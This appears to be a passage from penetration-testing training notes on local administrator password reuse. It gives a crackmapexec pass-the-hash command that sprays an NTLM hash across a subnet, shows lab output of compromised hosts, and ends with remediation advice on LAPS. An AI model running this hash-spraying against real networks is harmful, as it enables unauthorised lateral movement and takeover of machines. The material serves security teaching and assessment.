## Local Administrator Password Reuse

Sometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set.

`attempting to spray subnet for local admin access using extracted NTLM Hash`:
```shell-session
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc65
```

### Technique notes and remediation
This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth. It is always worth looking for this issue during penetration tests, even if it is not part of our path to compromise the domain, as it is a common issue and should be highlighted for our clients. One way to remediate this issue is using the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.